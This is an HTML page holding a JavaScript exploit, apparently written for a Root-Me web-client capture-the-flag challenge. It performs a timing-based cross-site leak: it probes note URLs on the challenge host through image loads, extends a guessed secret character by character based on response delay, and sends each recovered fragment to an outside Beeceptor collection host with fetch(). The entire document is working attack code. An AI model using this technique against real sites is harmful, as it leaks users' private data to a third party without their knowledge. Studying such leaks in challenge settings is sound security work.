<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
<script>const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
let id = 0;

async function findValidUrl() {
    while (true) {
        let url = base + id;
        let start = Date.now();
        let img = new Image();

        img.onload = img.onerror = () => {
            let duration = Date.now() - start;
            if (duration < 2000) return console.log("URL valide :", url);//, noteSearch(url + "/");
        };

        img.src = url;
        await new Promise(r => setTimeout(r, 100)); // Wait before next request
        id++;
    	if(id > 100) break;
    }
}

function makeRequest(url, added) {
    let start = Date.now();
    let img = new Image();

    img.onload = img.onerror = () => {
        let duration = Date.now() - start;
        if (duration > 2000) {
            fetch("https://rootmeleak2.free.beeceptor.com/" + added);
            console.log("Lente :", url);
            chars.split('').forEach(c => makeRequest(url + c, added + c));
        }
    };

    img.src = url;
}

function noteSearch(url) { chars.split('').forEach(c => makeRequest(url + c, c)); }

findValidUrl();
</script>
    
</body>
</html>
